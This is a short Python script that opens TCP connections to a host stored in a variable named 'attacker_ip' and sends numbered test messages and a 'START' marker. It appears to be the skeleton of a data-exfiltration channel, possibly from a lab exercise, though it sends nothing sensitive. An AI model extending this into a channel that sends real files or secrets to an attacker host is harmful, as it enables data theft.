import socket
import time

attacker_ip = "192.168.0.110"
server_address = (attacker_ip, 10000)


# print('connecting to {} port {}'.format(*server_address))


# try:
#
#     # Send data
#     message = b'123456789abcdefghijklmnopqrstuvw'
#     print('sending {!r}'.format(message))
#     sock.sendall(message)
#
#     # Look for the response
#     amount_received = 0
#     amount_expected = len(message)
#
#     while amount_received < amount_expected:
#         data = sock.recv(32)
#         amount_received += len(data)
#         print('received {!r}'.format(data))
#
# finally:
#     print('closing socket')
#     sock.close()


def send_data(data):
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(server_address)
    sock.sendall(data)
    # received = sock.recv(32)
    sock.close()
    # return received


for i in range(1,10):
    send_data("hi {}".format(i).encode())

send_data("START".encode())

